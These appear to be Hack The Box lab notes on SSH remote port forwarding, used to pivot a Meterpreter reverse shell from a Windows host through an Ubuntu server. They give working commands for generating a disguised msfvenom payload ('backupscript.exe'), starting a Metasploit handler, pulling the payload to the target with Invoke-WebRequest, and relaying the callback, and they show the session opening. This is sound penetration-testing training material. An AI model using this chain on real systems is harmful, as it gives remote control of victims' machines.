We have seen local port forwarding, where SSH can listen on our local host and forward a service on the remote host to our port, and dynamic port forwarding, where we can send packets to a remote network via a pivot host.

But sometimes, we might want to forward a local service to the remote port as well. Let's consider the scenario where we can RDP into the Windows host `Windows A`. As can be seen in the image below, in our previous case, we could pivot into the Windows host via the Ubuntu server.

![[33.webp]]

The idea here is to `get a reverse shell from the Windows A host` ; since the `outgoing` connection for the Windows A host is limited to the `172.16.5.0/23 network`, and he doesn’t know how to route the traffic, we won’t be able to have a direct connection to reach our attack host network.

We might want to `upload`/`download` files (when the RDP clipboard is disabled), `use exploits` or `low-level Windows API` using a Meterpreter session to perform enumeration on the Windows host, which is not possible using the built-in [Windows executables](https://lolbas-project.github.io/).

### **Creating a Windows Payload with msfvenom**

- To gain a `Meterpreter shell` on the Windows A host, we will create a Meterpreter HTTPS payload using `msfvenom`, but the configuration of the reverse connection for the payload would be the Ubuntu server's host IP address (`172.16.5.129`).
- We will use the port 8080 on the Ubuntu server to forward all of our reverse packets to our attack hosts' 8000 port, where our Metasploit listener is running.

```bash
Bailly@htb[/htb]$ msfvenom -p windows/x64/meterpreter/reverse_https lhost=172.16.5.129 -f exe -o backupscript.exe LPORT=8080

[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 712 bytes
Final size of exe file: 7168 bytes
Saved as: backupscript.exe
```

### Configuring & Starting the multi/handler :

```bash
msf6 > use exploit/multi/handler

[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_https
payload => windows/x64/meterpreter/reverse_https
msf6 exploit(multi/handler) > set lhost 0.0.0.0
lhost => 0.0.0.0
msf6 exploit(multi/handler) > set lport 8000
lport => 8000
msf6 exploit(multi/handler) > run

[*] Started HTTPS reverse handler on <https://0.0.0.0:8000>
```

### Transfering The Payload to the Ubuntu Host :

Once our payload is created, we can transfer it to the Ubuntu host using `scp`

```bash
Bailly@htb[/htb]$ scp backupscript.exe ubuntu@10.129.15.50:~/

backupscript.exe                                   100% 7168    65.4KB/s   00:00 
```

After copying the payload, we will start a `python3 HTTP server` using the below command on the Ubuntu server in the same directory where we copied our payload.

```bash
ubuntu@Webserver$ python3 -m http.server 8123
```

### **Downloading The Payload from Windows A Target**

```bash
PS C:\\Windows\\system32> Invoke-WebRequest -Uri "<http://172.16.5.129:8123/backupscript.exe>" -OutFile "C:\\backupscript.exe"
```

Once our payload is downloaded on the `Windows A Host`, it will connect to the `Ubuntu server’s port 8080`.

We’ll use `SSH remote port forwarding` to forward that connection to our msfconsole's listener service on port 8000 on our attack host

We will use `-vN` argument in our SSH command to make it verbose and ask it not to prompt the login shell. The `-R` command asks the Ubuntu server to listen on `<targetIPaddress>:8080` and forward all incoming connections on port `8080` to our msfconsole listener on `0.0.0.0:8000` of our `attack host`.

```bash
Bailly@htb[/htb]$ ssh -R 172.16.5.129:8080:0.0.0.0:8000 ubuntu@10.129.15.50 -vN
```

- `After creating` the `SSH remote port forward`, we can execute the payload from the Windows target. If the payload is executed as intended and attempts to connect back to our listener, we can see the logs from the pivot on the pivot host.

### Viewing The Logs From The Pivot

```bash
ebug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61355
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=5
debug1: channel 1: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: free: 172.16.5.19, nchannels 2
debug1: channel 1: connected to 0.0.0.0 port 8000
debug1: channel 1: free: 172.16.5.19, nchannels 1
debug1: client_input_channel_open: ctype forwarded-tcpip rchan 2 win 2097152 max 32768
debug1: client_request_forwarded_tcpip: listen 172.16.5.129 port 8080, originator 172.16.5.19 port 61356
debug1: connect_next: host 0.0.0.0 ([0.0.0.0]:8000) in progress, fd=4
debug1: channel 0: new [172.16.5.19]
debug1: confirm forwarded-tcpip
debug1: channel 0: connected to 0.0.0.0 port 8000
```

If all is set up properly, we will receive a Meterpreter shell pivoted `via` the `Ubuntu server`.

```bash
[*] Started HTTPS reverse handler on <https://0.0.0.0:8000>
[!] <https://0.0.0.0:8000> handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] <https://0.0.0.0:8000> handling request from 127.0.0.1; (UUID: x2hakcz9) Staging x64 payload (201308 bytes) ...
[!] <https://0.0.0.0:8000> handling request from 127.0.0.1; (UUID: x2hakcz9) Without a database connected that payload UUID tracking will not work!
[*] Meterpreter session 1 opened (127.0.0.1:8000 -> 127.0.0.1 ) at 2022-03-02 10:48:10 -0500

meterpreter > shell
Process 3236 created.
Channel 1 created.
Microsoft Windows [Version 10.0.17763.1637]
(c) 2018 Microsoft Corporation. All rights reserved.

C:\\>
```

![[44.webp]]